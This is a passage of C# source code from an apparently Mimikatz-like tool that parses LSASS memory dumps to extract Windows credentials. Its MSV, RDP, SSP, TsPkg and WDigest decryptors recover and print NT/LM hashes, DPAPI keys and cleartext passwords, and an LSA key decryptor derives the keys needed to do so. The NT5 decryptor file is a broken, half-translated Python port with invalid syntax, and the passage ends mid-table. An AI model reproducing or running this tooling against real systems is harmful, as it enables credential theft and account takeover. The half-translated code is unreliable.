
                                var usLogonDomainName = ReadStruct<UNICODE_STRING>(GetBytes(msvDecryptedCredentialsBytes, template.LogonDomainNameOffset, Marshal.SizeOf(typeof(UNICODE_STRING))));
                                var usUserName = ReadStruct<UNICODE_STRING>(GetBytes(msvDecryptedCredentialsBytes, template.UserNameOffset, Marshal.SizeOf(typeof(UNICODE_STRING))));

                                msventry = new Msv();
                                msventry.DomainName = Encoding.Unicode.GetString(GetBytes(msvDecryptedCredentialsBytes, usLogonDomainName.Buffer, usLogonDomainName.Length));
                                msventry.UserName = "  " + Encoding.Unicode.GetString(GetBytes(msvDecryptedCredentialsBytes, usUserName.Buffer, usUserName.Length));

                                string lmhash = PrintHashBytes(GetBytes(msvDecryptedCredentialsBytes, template.LmOwfPasswordOffset, LM_NTLM_HASH_LENGTH));
                                if (lmhash != "00000000000000000000000000000000")
                                    msventry.Lm = "     " + lmhash;
                                msventry.NT = "     " + PrintHashBytes(GetBytes(msvDecryptedCredentialsBytes, template.NtOwfPasswordOffset, LM_NTLM_HASH_LENGTH));
                                msventry.Sha1 = "   " + PrintHashBytes(GetBytes(msvDecryptedCredentialsBytes, template.ShaOwPasswordOffset, SHA_DIGEST_LENGTH));
                                string dpapi = PrintHashBytes(GetBytes(msvDecryptedCredentialsBytes, template.DPAPIProtectedOffset, LM_NTLM_HASH_LENGTH));
                                if (dpapi != "00000000000000000000000000000000" && dpapi != "0c000e00000000005800000000000000")
                                    msventry.Dpapi = "  " + dpapi;

                                var currentlogon = minidump.logonlist.FirstOrDefault(x => x.LogonId.HighPart == luid.HighPart && x.LogonId.LowPart == luid.LowPart);
                                if (currentlogon == null)
                                    Console.WriteLine("[x] Something goes wrong");
                                else
                                    currentlogon.Msv = msventry;
                            }

                            lsasscred = primaryCredentials.next;
                        }

                        lsasscred = pNext;
                    }
                }
            }

            return 0;
        }
    }
}
```

`Decryptor/Rdp_.cs`:

```cs
using Minidump.Streams;
using Minidump.Templates;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using static Minidump.Helpers;

namespace Minidump.Decryptor
{
    public class Rdp_
    {
        public static int FindCredentials(Program.MiniDump minidump, rdp.RdpTemplate template)
        {
            foreach (byte[] signature in template.signature)
            {
                rdp.WTS_KIWI cred = new rdp.WTS_KIWI();

                List<long> positions = find_all_global(minidump.fileBinaryReader, signature);
                foreach (long pos in positions)
                {
                    if (pos <= 0)
                        continue;

                    minidump.fileBinaryReader.BaseStream.Seek(pos + template.first_entry_offset, 0);
                    try
                    {
                        byte[] credBytes = minidump.fileBinaryReader.ReadBytes(Marshal.SizeOf(typeof(rdp.WTS_KIWI)));
                        cred = ReadStruct<rdp.WTS_KIWI>(credBytes);
                    }
                    catch
                    {
                        continue;
                    }

                    if (cred.cbDomain <= 512 && cred.cbUsername <= 512 && cred.cbPassword <= 512 && cred.cbPassword > 0)
                    {
                        try
                        {
                            string domain = Encoding.ASCII.GetString(cred.Domain.Take(cred.cbDomain).ToArray());
                            string username = Encoding.ASCII.GetString(cred.UserName.Take(cred.cbUsername).ToArray());
                            byte[] password_raw = cred.Password.Take(cred.cbPassword).ToArray();

                            if (string.IsNullOrEmpty(domain) || string.IsNullOrEmpty(username))
                                continue;

                            //credentials are encrypted
                            if (minidump.sysinfo.BuildNumber >= (int)SystemInfo.WindowsMinBuild.WIN_10)
                                continue;

                            Console.WriteLine(username);
                            Console.WriteLine(domain);
                            Console.WriteLine(PrintHexBytes(password_raw));

                            PrintProperties(cred);
                        }
                        catch { }
                    }
                }
            }

            return 0;
        }
    }
}
```

`Decryptor/Ssp_.cs`:

```cs
using Minidump.Crypto;
using Minidump.Templates;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using static Minidump.Helpers;

namespace Minidump.Decryptor
{
    internal class Ssp_
    {
        public static int FindCredentials(Program.MiniDump minidump, ssp.SspTemplate template)
        {
            ssp.KIWI_SSP_CREDENTIAL_LIST_ENTRY entry;
            string passDecrypted = "";
            long llCurrent;
            long sspCredentialListAddr;

            long position = find_signature(minidump, "msv1_0.dll", template.signature);
            if (position == 0)
                return 0;

            var ptr_entry_loc = (long)get_ptr_with_offset(minidump.fileBinaryReader, (position + template.first_entry_offset), minidump.sysinfo);
            sspCredentialListAddr = ReadInt64(minidump.fileBinaryReader, (long)ptr_entry_loc);

            llCurrent = sspCredentialListAddr;

            do
            {
                llCurrent = Rva2offset(minidump, llCurrent);
                minidump.fileBinaryReader.BaseStream.Seek(llCurrent, 0);

                byte[] entryBytes = minidump.fileBinaryReader.ReadBytes(Marshal.SizeOf(typeof(ssp.KIWI_SSP_CREDENTIAL_LIST_ENTRY)));
                entry = ReadStruct<ssp.KIWI_SSP_CREDENTIAL_LIST_ENTRY>(entryBytes);

                string username = ExtractUnicodeStringString(minidump, entry.credentials.UserName);
                string domain = ExtractUnicodeStringString(minidump, entry.credentials.Domain);
                int reference = (int)entry.References;

                minidump.fileBinaryReader.BaseStream.Seek(Rva2offset(minidump, entry.credentials.Password.Buffer), 0);
                byte[] msvPasswordBytes = minidump.fileBinaryReader.ReadBytes(entry.credentials.Password.MaximumLength);
                byte[] msvDecryptedPasswordBytes = BCrypt.DecryptCredentials(msvPasswordBytes, minidump.lsakeys);

                passDecrypted = Encoding.Unicode.GetString(msvDecryptedPasswordBytes);

                if (!string.IsNullOrEmpty(username) && username.Length > 1 && msvDecryptedPasswordBytes.Length > 1)
                {
                    LUID luid = entry.LogonId;

                    Ssp sspentry = new Ssp();
                    //sspentry.Reference = reference;
                    sspentry.UserName = username;

                    if (!string.IsNullOrEmpty(domain))
                    {
                        sspentry.DomainName = domain;
                    }
                    else
                    {
                        sspentry.DomainName = "NULL";
                    }

                    if (!string.IsNullOrEmpty(passDecrypted))
                    {
                        sspentry.Password = passDecrypted;
                    }
                    else
                    {
                        sspentry.Password = "NULL";
                    }

                    try
                    {
                        sspentry.NT = msvDecryptedPasswordBytes.MD4().AsHexString();
                    }
                    catch
                    {
                        sspentry.NT = "NULL";
                    }

                    if (sspentry.Password != "NULL")
                    {
                        Logon currentlogon = minidump.logonlist.FirstOrDefault(x => x.LogonId.HighPart == luid.HighPart && x.LogonId.LowPart == luid.LowPart);
                        if (currentlogon == null)
                        {
                            currentlogon = new Logon(luid);
                            currentlogon.UserName = username;
                            currentlogon.Ssp = new List<Ssp>();
                            currentlogon.Ssp.Add(sspentry);
                            minidump.logonlist.Add(currentlogon);
                        }
                        else
                        {
                            if (currentlogon.Ssp == null)
                                currentlogon.Ssp = new List<Ssp>();

                            currentlogon.Ssp.Add(sspentry);
                        }
                    }
                }

                llCurrent = entry.Flink;
            } while (llCurrent != sspCredentialListAddr);

            return 0;
        }
    }
}
```

`Decryptor/Tspkg_.cs`:

```cs
using Minidump.Crypto;
using Minidump.Templates;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using static Minidump.Helpers;

namespace Minidump.Decryptor
{
    public class Tspkg_
    {
        private static readonly long max_search_size = 170000;

        public static int FindCredentials(Program.MiniDump minidump, tspkg.TspkgTemplate template)
        {
            RTL_AVL_TABLE entry;
            long llCurrent;

            long tsGlobalCredTableAddr = find_signature(minidump, "TSpkg.dll", template.signature);

            if (tsGlobalCredTableAddr != 0)
            {
                long ptr_entry_loc = (long)get_ptr_with_offset(minidump.fileBinaryReader, tsGlobalCredTableAddr + template.avl_offset, minidump.sysinfo);
                long ptr_entry = (long)Minidump.Helpers.ReadUInt64(minidump.fileBinaryReader, (long)ptr_entry_loc);
                //ptr_entry = Rva2offset(minidump, ptr_entry);
                //minidump.fileBinaryReader.BaseStream.Seek(ptr_entry, 0);
                //byte[] entryBytes = minidump.fileBinaryReader.ReadBytes(Marshal.SizeOf(typeof(RTL_AVL_TABLE)));
                //entry = ReadStruct<RTL_AVL_TABLE>(entryBytes);
                //
                //llCurrent = entry.BalancedRoot.RightChild;

                WalkAVLTables(minidump, template, ptr_entry);

                return 0;
            }

            return 1;
        }

        private static void WalkAVLTables(Program.MiniDump minidump, tspkg.TspkgTemplate template, long pElement)
        {
            pElement = Rva2offset(minidump, pElement);
            minidump.fileBinaryReader.BaseStream.Seek(pElement, 0);

            if (pElement == 0)
                return;

            var entryBytes = minidump.fileBinaryReader.ReadBytes(Marshal.SizeOf(typeof(RTL_AVL_TABLE)));
            var entry = ReadStruct<RTL_AVL_TABLE>(entryBytes);

            //Minidump.Helpers.PrintProperties(entry.BalancedRoot);

            if (entry.OrderedPointer != 0)
            {
                pElement = Rva2offset(minidump, entry.OrderedPointer);
                minidump.fileBinaryReader.BaseStream.Seek(pElement, 0);

                var krbrLogonSessionBytes = minidump.fileBinaryReader.ReadBytes(template.TSCredTypeSize);
                var luid = ReadStruct<LUID>(GetBytes(krbrLogonSessionBytes, template.TSCredLocallyUniqueIdentifierOffset, Marshal.SizeOf(typeof(LUID))));

                long pCredAddr = Rva2offset(minidump, BitConverter.ToInt64(krbrLogonSessionBytes, template.TSCredOffset));
                minidump.fileBinaryReader.BaseStream.Seek(pCredAddr, 0);

                var pCredBytes = minidump.fileBinaryReader.ReadBytes(Marshal.SizeOf(typeof(KIWI_TS_PRIMARY_CREDENTIAL)));
                var pCred = ReadStruct<KIWI_TS_PRIMARY_CREDENTIAL>(pCredBytes);

                var usUserName = pCred.credentials.UserName;
                var usDomain = pCred.credentials.Domain;
                var usPassword = pCred.credentials.Password;

                var username = ExtractUnicodeStringString(minidump, usUserName);
                var domain = ExtractUnicodeStringString(minidump, usDomain);

                byte[] msvPasswordBytes = minidump.fileBinaryReader.ReadBytes(usPassword.MaximumLength);
                var msvDecryptedPasswordBytes = BCrypt.DecryptCredentials(msvPasswordBytes, minidump.lsakeys);

                var passDecrypted = "";
                var NT = "";
                var encoder = new UnicodeEncoding(false, false, true);
                try
                {
                    passDecrypted = encoder.GetString(msvDecryptedPasswordBytes);
                }
                catch (Exception)
                {
                    passDecrypted = PrintHexBytes(msvDecryptedPasswordBytes);
                }

                if (msvDecryptedPasswordBytes.Length > 0)
                {
                    try
                    {
                        NT = msvDecryptedPasswordBytes.MD4().AsHexString();
                    }
                    catch
                    {
                        NT = "NULL";
                    }
                }

                if (!string.IsNullOrEmpty(username) && username.Length > 1)
                {
                    Tspkg krbrentry = new Tspkg();
                    krbrentry.UserName = username;

                    if (!string.IsNullOrEmpty(domain))
                        krbrentry.DomainName = domain;
                    else
                        krbrentry.DomainName = "NULL";

                    if (!string.IsNullOrEmpty(passDecrypted))
                        krbrentry.Password = passDecrypted;
                    else
                        krbrentry.Password = "NULL";

                    krbrentry.NT = NT;

                    //Minidump.Helpers.PrintProperties(krbrentry);
                    if (krbrentry.Password != "NULL")
                    {
                        var currentlogon = minidump.logonlist.FirstOrDefault(x => x.LogonId.HighPart == luid.HighPart && x.LogonId.LowPart == luid.LowPart);
                        if (currentlogon == null)
                        {
                            currentlogon = new Logon(luid);
                            currentlogon.UserName = username;
                            currentlogon.Tspkg = new List<Tspkg>();
                            currentlogon.Tspkg.Add(krbrentry);
                            minidump.logonlist.Add(currentlogon);
                        }
                        else
                        {
                            currentlogon.Tspkg = new List<Tspkg>();
                            currentlogon.Tspkg.Add(krbrentry);
                        }
                    }
                }
            }

            if (entry.BalancedRoot.RightChild != 0)
                WalkAVLTables(minidump, template, entry.BalancedRoot.RightChild);
            if (entry.BalancedRoot.LeftChild != 0)
                WalkAVLTables(minidump, template, entry.BalancedRoot.LeftChild);
        }
    }
}
```

`Decryptor/WDigest_.cs`:

```cs
using Minidump.Crypto;
using Minidump.Templates;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using static Minidump.Helpers;

namespace Minidump.Decryptor
{
    internal class WDigest_
    {
        public static int FindCredentials(Program.MiniDump minidump, wdigest.WdigestTemplate template)
        {
            wdigest.KIWI_WDIGEST_LIST_ENTRY entry;
            long logSessListAddr;
            long llCurrent;
            var passDecrypted = "";

            long position = find_signature(minidump, "wdigest.dll", template.signature);
            if (position == 0)
                return 0;

            var ptr_entry_loc = get_ptr_with_offset(minidump.fileBinaryReader, (position + template.first_entry_offset), minidump.sysinfo);
            var ptr_entry = ReadUInt64(minidump.fileBinaryReader, (long)ptr_entry_loc);
            logSessListAddr = Rva2offset(minidump, (long)ptr_entry);

            minidump.fileBinaryReader.BaseStream.Seek(logSessListAddr, 0);
            byte[] entryBytes = minidump.fileBinaryReader.ReadBytes(Marshal.SizeOf(typeof(wdigest.KIWI_WDIGEST_LIST_ENTRY)));

            var pThis = BitConverter.ToInt64(entryBytes, FieldOffset<wdigest.KIWI_WDIGEST_LIST_ENTRY>("This"));
            llCurrent = pThis;

            do
            {
                llCurrent = Rva2offset(minidump, llCurrent);
                minidump.fileBinaryReader.BaseStream.Seek(llCurrent, 0);
                entryBytes = minidump.fileBinaryReader.ReadBytes(Marshal.SizeOf(typeof(wdigest.KIWI_WDIGEST_LIST_ENTRY)));
                entry = ReadStruct<wdigest.KIWI_WDIGEST_LIST_ENTRY>(entryBytes);

                if (entry.UsageCount == 1)
                {
                    minidump.fileBinaryReader.BaseStream.Seek(llCurrent + template.USERNAME_OFFSET, 0);
                    var username = ExtractUnicodeStringString(minidump, ExtractUnicodeString(minidump.fileBinaryReader));
                    minidump.fileBinaryReader.BaseStream.Seek(llCurrent + template.HOSTNAME_OFFSET, 0);
                    var hostname = ExtractUnicodeStringString(minidump, ExtractUnicodeString(minidump.fileBinaryReader));
                    minidump.fileBinaryReader.BaseStream.Seek(llCurrent + template.PASSWORD_OFFSET, 0);
                    var password = ExtractUnicodeStringString(minidump, ExtractUnicodeString(minidump.fileBinaryReader));

                    if (!string.IsNullOrEmpty(username) && username.Length > 1)
                    {
                        var luid = entry.LocallyUniqueIdentifier;

                        var wdigestentry = new WDigest();
                        wdigestentry.UserName = username;

                        if (!string.IsNullOrEmpty(hostname))
                            wdigestentry.HostName = hostname;
                        else
                            wdigestentry.HostName = "NULL";

                        byte[] passDecryptedBytes = new byte[] { };
                        if (!string.IsNullOrEmpty(password) && password.Length % 2 == 0)
                        {
                            passDecryptedBytes = BCrypt.DecryptCredentials(Encoding.Unicode.GetBytes(password), minidump.lsakeys);
                            passDecrypted = Encoding.Unicode.GetString(passDecryptedBytes);
                            if (passDecrypted.Length > 0)
                                wdigestentry.Password = passDecrypted;
                        }
                        else
                        {
                            wdigestentry.Password = "NULL";
                        }

                        if (passDecryptedBytes.Length > 0)
                        {
                            try
                            {
                                wdigestentry.NT = passDecryptedBytes.MD4().AsHexString();
                            }
                            catch
                            {
                                wdigestentry.NT = "NULL";
                            }
                        }

                        if (wdigestentry.Password != "NULL")
                        {
                            var currentlogon = minidump.logonlist.FirstOrDefault(x => x.LogonId.HighPart == luid.HighPart && x.LogonId.LowPart == luid.LowPart);
                            if (currentlogon == null)
                            {
                                currentlogon = new Logon(luid)
                                {
                                    UserName = username,
                                    Wdigest = new List<WDigest>()
                                };
                                currentlogon.Wdigest.Add(wdigestentry);
                                minidump.logonlist.Add(currentlogon);
                            }
                            else
                            {
                                currentlogon.Wdigest = new List<WDigest>();
                                currentlogon.Wdigest.Add(wdigestentry);
                            }
                        }
                    }
                }

                llCurrent = entry.Flink;
            } while (llCurrent != (long)ptr_entry);

            return 0;
        }
    }
}
```

`Decryptor/lsadecryptor_lsa_decryptor.cs`:

```cs
using Minidump.Templates;
using System;

namespace Minidump.Decryptor
{
    public class LsaDecryptor
    {
        public struct LsaKeys
        {
            public byte[] iv;
            public byte[] aes_key;
            public byte[] des_key;
        }

        public static LsaKeys choose(Program.MiniDump minidump, object template)
        {
            if (template.GetType() == typeof(lsaTemplate_NT6.LsaTemplate_NT6))
            {
                return LsaDecryptor_NT6.LsaDecryptor(minidump, (lsaTemplate_NT6.LsaTemplate_NT6)template);
            }
            else
            {
                throw new Exception($"NT5 not yet supported");
            }
        }
    }
}
```

`Decryptor/lsadecryptor_lsa_decryptor_nt5.cs`:

```cs
using System;

using System.Linq;

namespace Minidump.Decryptor
{

    public class LsaDecryptor_NT5

    public object decryptor_template;
        
        public object des_key;
        
        public object feedback;
        
        public object feedback_offset;
        
        public object random_key;
        
        public LsaDecryptor_NT5(object reader, object decryptor_template, object sysinfo)
            : base(null, sysinfo, reader) {
            decryptor_template = decryptor_template;
            feedback;
            feedback_offset;
            des_key;
            random_key;
            acquire_crypto_material();
        }
        
        public virtual object acquire_crypto_material() {
            Console.WriteLine("Acquireing crypto stuff...");
            var sigpos = find_signature();
            reader.move(sigpos);
            //data = self.reader.peek(0x50)
            //self.Console.WriteLine('Memory looks like this around the signature\n%s' % hexdump(data, start = sigpos))
            foreach (var x in new List<object> {
                decryptor_template.feedback_ptr_offset,
                decryptor_template.old_feedback_offset
            }) {
                feedback_offset = x;
                try {
                    feedback = get_feedback(sigpos);
                    //self.Console.WriteLine('Feedback bytes:\n%s' % hexdump(self.feedback, start = 0))
                    des_key = get_key(sigpos);
                    random_key = get_random(sigpos);
                    //self.Console.WriteLine('randomkey bytes:\n%s' % hexdump(self.random_key, start = 0))
                } catch {
                    traceback.print_exc();
                    input();
                }
            }
        }
        
        public virtual object get_feedback(object sigpos) {
            if (decryptor_template.arch == "x86") {
                var new_ptr = reader.get_ptr_with_offset(sigpos + feedback_offset);
                reader.move(new_ptr);
                return reader.read(8);
            } else {
                reader.move(sigpos + feedback_offset);
                var offset = LONG(reader).value;
                var newpos = sigpos + feedback_offset + 4 + offset;
                reader.move(newpos);
                return reader.read(8);
            }
        }
        
        public virtual object get_key(object sigpos) {
            object des_key;
            object des_key_ptr;
            if (decryptor_template.arch == "x86") {
                var new_ptr = reader.get_ptr_with_offset(sigpos + decryptor_template.desx_key_ptr_offset);
                reader.move(new_ptr);
                des_key_ptr = decryptor_template.key_struct_ptr(reader);
                des_key = des_key_ptr.read(reader);
            } else {
                reader.move(sigpos + decryptor_template.desx_key_ptr_offset);
                var offset = LONG(reader).value;
                var newpos = sigpos + decryptor_template.desx_key_ptr_offset + 4 + offset;
                reader.move(newpos);
                des_key_ptr = decryptor_template.key_struct_ptr(reader);
                des_key = des_key_ptr.read(reader);
            }
            return des_key;
        }
        
        public virtual object get_random(object sigpos) {
            if (decryptor_template.arch == "x86") {
                var random_key_ptr = reader.get_ptr_with_offset(sigpos + decryptor_template.randomkey_ptr_offset);
                random_key_ptr = reader.get_ptr_with_offset(random_key_ptr);
                reader.move(random_key_ptr);
            } else {
                reader.move(sigpos + decryptor_template.randomkey_ptr_offset);
                var offset = LONG(reader).value;
                var newpos = sigpos + decryptor_template.desx_key_ptr_offset + 4 + offset;
                reader.move(newpos);
            }
            return reader.read(256);
        }
        
        public virtual object find_signature() {
            Console.WriteLine("Looking for main struct signature in memory...");
            var fl = reader.find_in_module("lsasrv.dll", decryptor_template.signature);
            if (fl.Count == 0) {
                logging.debug(String.Format("signature not found! %s", decryptor_template.signature.hex()));
                throw new Exception("LSA signature not found!");
            }
            Console.WriteLine(String.Format("Found candidates on the following positions: %s", " ".join(from x in fl
                select hex(x))));
            Console.WriteLine(String.Format("Selecting first one @ 0x%08x", fl[0]));
            return fl[0];
        }
        
        public virtual object decrypt(object encrypted) {
            // TODO: NT version specific, move from here in subclasses.
            var cleartext = new byte[] {  };
            var size = encrypted.Count;
            if (size) {
                if (size % 8 != 0) {
                    var ctx = RC4(random_key);
                    cleartext = ctx.decrypt(encrypted);
                } else {
                    //print('Decryption not implemented!')
                    cleartext = @__desx_decrypt(encrypted);
                    //raise Exception('Not implemented!')
                }
            }
            return cleartext;
        }
        
        public virtual object dump() {
            Console.WriteLine("Recovered LSA encryption keys\n");
            Console.WriteLine("Feedback ({}): {}".format(feedback.Count, feedback.hex()));
            Console.WriteLine("Random Key ({}): {}".format(random_key.Count, random_key.hex()));
            Console.WriteLine("DESX inputwhitening Key ({}): {}".format(des_key.inputWhitening.Count, des_key.inputWhitening.hex()));
            Console.WriteLine("DESX outputwhitening Key ({}): {}".format(des_key.outputWhitening.Count, des_key.outputWhitening.hex()));
            //self.Console.WriteLine('DESX DES Expanded Key ({}): {}' % (self.des_key.desKey.roundKey))
        }
        
        public virtual void @__desx_decrypt_internal_block(object chunk) {
            chunk = xor(chunk, des_key.outputWhitening);
            chunk = @__desx_internal_block(chunk, encrypt: false);
            chunk = xor(chunk, des_key.inputWhitening);
            return chunk;
        }
        
        public virtual object @__desx_decrypt(object data) {
            var res = new byte[] {  };
            var i = 0;
            var IV = feedback;
            while (i != data.Count) {
                var chunk = @__desx_decrypt_internal_block(data[i::(i  +  8)]);
                res += xor(chunk, IV);
                IV = data[i::(i  +  8)];
                i += 8;
            }
            return res;
        }
        
        public virtual object @__desx_internal_block(object data, object encrypt = false) {
            var L = @int.from_bytes(data[4], "little", signed: false);
            var R = @int.from_bytes(data[::4], "little", signed: false);
            //t = 'ORIGINAL L: %s R: %s' % (L,R)
            //input(t)
            //print(hex(R))
            R = rol32(R, 4);
            //input(hex(R))
            var Ta = (L ^ R) & 0xf0f0f0f0;
            //input('Ta ' + hex(Ta))
            L = L ^ Ta;
            R = R ^ Ta;
            L = rol32(L, 20);
            Ta = (L ^ R) & 0xfff0000f;
            //input('Ta ' + hex(Ta))
            L = L ^ Ta;
            R = R ^ Ta;
            L = rol32(L, 14);
            Ta = (L ^ R) & 0x33333333;
            //input('Ta ' + hex(Ta))
            L = L ^ Ta;
            R = R ^ Ta;
            R = rol32(R, 22);
            Ta = (L ^ R) & 0x03fc03fc;
            //input('Ta ' + hex(Ta))
            L = L ^ Ta;
            R = R ^ Ta;
            R = rol32(R, 9);
            Ta = (L ^ R) & 0xaaaaaaaa;
            //input('Ta ' + hex(Ta))
            L = L ^ Ta;
            R = R ^ Ta;
            L = rol32(L, 1);
            //t = 'BEFORE F! L: %s R: %s' % (L,R)
            //input(t)
            if (encrypt) {
                foreach (var i in Enumerable.Range(0, Convert.ToInt32(Math.Ceiling(Convert.ToDouble(14 - 0) / 2))).Select(_x_1 => 0 + _x_1 * 2)) {
                    var _tup_1 = F(L, R, des_key.desKey.roundKey[i]);
                    L = _tup_1.Item1;
                    R = _tup_1.Item2;
                    var _tup_2 = F(R, L, des_key.desKey.roundKey[i + 1]);
                    R = _tup_2.Item1;
                    L = _tup_2.Item2;
                }
            } else {
                foreach (var i in Enumerable.Range(0, Convert.ToInt32(Math.Ceiling(Convert.ToDouble(-2 - 14) / -2))).Select(_x_2 => 14 + _x_2 * -2)) {
                    //print(i)
                    var _tup_3 = F(L, R, des_key.desKey.roundKey[i + 1]);
                    L = _tup_3.Item1;
                    R = _tup_3.Item2;
                    //t = 'F(%s) L: %s R: %s' % (i, L,R)
                    //input(t)
                    var _tup_4 = F(R, L, des_key.desKey.roundKey[i]);
                    R = _tup_4.Item1;
                    L = _tup_4.Item2;
                    //t = 'F(%s) L: %s R: %s' % (i, L,R)
                    //input(t)
                    //t = 'AFTER F! L: %s R: %s' % (L,R)
                    //input(t)
                }
            }
            R = ror32(R, 1);
            Ta = (L ^ R) & 0xaaaaaaaa;
            L = L ^ Ta;
            R = R ^ Ta;
            L = ror32(L, 9);
            Ta = (L ^ R) & 0x03fc03fc;
            L ^= Ta;
            R ^= Ta;
            L = ror32(L, 22);
            Ta = (L ^ R) & 0x33333333;
            L ^= Ta;
            R ^= Ta;
            R = ror32(R, 14);
            Ta = (L ^ R) & 0xfff0000f;
            L ^= Ta;
            R ^= Ta;
            R = ror32(R, 20);
            Ta = (L ^ R) & 0xf0f0f0f0;
            L ^= Ta;
            R ^= Ta;
            L = ror32(L, 4);
            return L.to_bytes(4, "little", signed: false) + R.to_bytes(4, "little", signed: false);
        }
    }
    
    public static List<List<int>> SymCryptDesSpbox = new List<List<int>> {
        new List<int> {
            0x02080800,
            0x00080000,
            0x02000002,
            0x02080802,
            0x02000000,
            0x00080802,
            0x00080002,
            0x02000002,
            0x00080802,
            0x02080800,
            0x02080000,
            0x00000802,
            0x02000802,
            0x02000000,
            0x00000000,
            0x00080002,
            0x00080000,
            0x00000002,
            0x02000800,
            0x00080800,
            0x02080802,
            0x02080000,
            0x00000802,
            0x02000800,
            0x00000002,
            0x00000800,
            0x00080800,
            0x02080002,
            0x00000800,
            0x02000802,
            0x02080002,
            0x00000000,
            0x00000000,
            0x02080802,
            0x02000800,
            0x00080002,
            0x02080800,
            0x00080000,
            0x00000802,
            0x02000800,
            0x02080002,
            0x00000800,
            0x00080800,
            0x02000002,
            0x00080802,
            0x00000002,
            0x02000002,
            0x02080000,
            0x02080802,
            0x00080800,
            0x02080000,
            0x02000802,
            0x02000000,
            0x00000802,
            0x00080002,
            0x00000000,
            0x00080000,
            0x02000000,
            0x02000802,
            0x02080800,
            0x00000002,
            0x02080002,
            0x00000800,
            0x00080802
        },
        new List<int> {
            0x40108010,
            0x00000000,
            0x00108000,
            0x40100000,
            0x40000010,
            0x00008010,
            0x40008000,
            0x00108000,
            0x00008000,
            0x40100010,
            0x00000010,
            0x40008000,
            0x00100010,
            0x40108000,
            0x40100000,
            0x00000010,
            0x00100000,
            0x40008010,
            0x40100010,
            0x00008000,
            0x00108010,
            0x40000000,
            0x00000000,
            0x00100010,
            0x40008010,
            0x00108010,
            0x40108000,
            0x40000010,
            0x40000000,
            0x00100000,
            0x00008010,
            0x40108010,
            0x00100010,
            0x40108000,
            0x40008000,
            0x00108010,
            0x40108010,
            0x00100010,
            0x40000010,
            0x00000000,
            0x40000000,
            0x00008010,
            0x00100000,
            0x40100010,
            0x00008000,
            0x40000000,
            0x00108010,
            0x40008010,
            0x40108000,
            0x00008000,
            0x00000000,
            0x40000010,
            0x00000010,
            0x40108010,
            0x00108000,
            0x40100000,
            0x40100010,
            0x00100000,
            0x00008010,
            0x40008000,
            0x40008010,
            0x00000010,
            0x40100000,
            0x00108000
        },
        new List<int> {
            0x04000001,
            0x04040100,
            0x00000100,
            0x04000101,
            0x00040001,
            0x04000000,
            0x04000101,
            0x00040100,
            0x04000100,
            0x00040000,
            0x04040000,
            0x00000001,
            0x04040101,
            0x00000101,
            0x00000001,
            0x04040001,
            0x00000000,
            0x00040001,
            0x04040100,
            0x00000100,
            0x00000101,
            0x04040101,
            0x00040000,
            0x04000001,
            0x04040001,
            0x04000100,
            0x00040101,
            0x04040000,
            0x00040100,
            0x00000000,
            0x04000000,
            0x00040101,
            0x04040100,
            0x00000100,
            0x00000001,
            0x00040000,
            0x00000101,
            0x00040001,
            0x04040000,
            0x04000101,
            0x00000000,
            0x04040100,
            0x00040100,
            0x04040001,
            0x00040001,
            0x04000000,
            0x04040101,
            0x00000001,
            0x00040101,
            0x04000001,
            0x04000000,
            0x04040101,
            0x00040000,
            0x04000100,
            0x04000101,
            0x00040100,
            0x04000100,
            0x00000000,
            0x04040001,
            0x00000101,
            0x04000001,
            0x00040101,
            0x00000100,
            0x04040000
        },
        new List<int> {
            0x00401008,
            0x10001000,
            0x00000008,
            0x10401008,
            0x00000000,
            0x10400000,
            0x10001008,
            0x00400008,
            0x10401000,
            0x10000008,
            0x10000000,
            0x00001008,
            0x10000008,
            0x00401008,
            0x00400000,
            0x10000000,
            0x10400008,
            0x00401000,
            0x00001000,
            0x00000008,
            0x00401000,
            0x10001008,
            0x10400000,
            0x00001000,
            0x00001008,
            0x00000000,
            0x00400008,
            0x10401000,
            0x10001000,
            0x10400008,
            0x10401008,
            0x00400000,
            0x10400008,
            0x00001008,
            0x00400000,
            0x10000008,
            0x00401000,
            0x10001000,
            0x00000008,
            0x10400000,
            0x10001008,
            0x00000000,
            0x00001000,
            0x00400008,
            0x00000000,
            0x10400008,
            0x10401000,
            0x00001000,
            0x10000000,
            0x10401008,
            0x00401008,
            0x00400000,
            0x10401008,
            0x00000008,
            0x10001000,
            0x00401008,
            0x00400008,
            0x00401000,
            0x10400000,
            0x10001008,
            0x00001008,
            0x10000000,
            0x10000008,
            0x10401000
        },
        new List<int> {
            0x08000000,
            0x00010000,
            0x00000400,
            0x08010420,
            0x08010020,
            0x08000400,
            0x00010420,
            0x08010000,
            0x00010000,
            0x00000020,
            0x08000020,
            0x00010400,
            0x08000420,
            0x08010020,
            0x08010400,
            0x00000000,
            0x00010400,
            0x08000000,
            0x00010020,
            0x00000420,
            0x08000400,
            0x00010420,
            0x00000000,
            0x08000020,
            0x00000020,
            0x08000420,
            0x08010420,
            0x00010020,
            0x08010000,
            0x00000400,
            0x00000420,
            0x08010400,
            0x08010400,
            0x08000420,
            0x00010020,
            0x08010000,
            0x00010000,
            0x00000020,
            0x08000020,
            0x08000400,
            0x08000000,
            0x00010400,
            0x08010420,
            0x00000000,
            0x00010420,
            0x08000000,
            0x00000400,
            0x00010020,
            0x08000420,
            0x00000400,
            0x00000000,
            0x08010420,
            0x08010020,
            0x08010400,
            0x00000420,
            0x00010000,
            0x00010400,
            0x08010020,
            0x08000400,
            0x00000420,
            0x00000020,
            0x00010420,
            0x08010000,
            0x08000020
        },
        new List<int> {
            0x80000040,
            0x00200040,
            0x00000000,
            0x80202000,
            0x00200040,
            0x00002000,
            0x80002040,
            0x00200000,
            0x00002040,
            0x80202040,
            0x00202000,
            0x80000000,
            0x80002000,
            0x80000040,
            0x80200000,
            0x00202040,
            0x00200000,
            0x80002040,
            0x80200040,
            0x00000000,
            0x00002000,
            0x00000040,
            0x80202000,
            0x80200040,
            0x80202040,
            0x80200000,
            0x80000000,
            0x00002040,
            0x00000040,
            0x00202000,
            0x00202040,
            0x80002000,
            0x00002040,
            0x80000000,
            0x80002000,
            0x00202040,
            0x80202000,
            0x00200040,
            0x00000000,
            0x80002000,
            0x80000000,
            0x00002000,
            0x80200040,
            0x00200000,
            0x00200040,
            0x80202040,
            0x00202000,
            0x00000040,
            0x80202040,
            0x00202000,
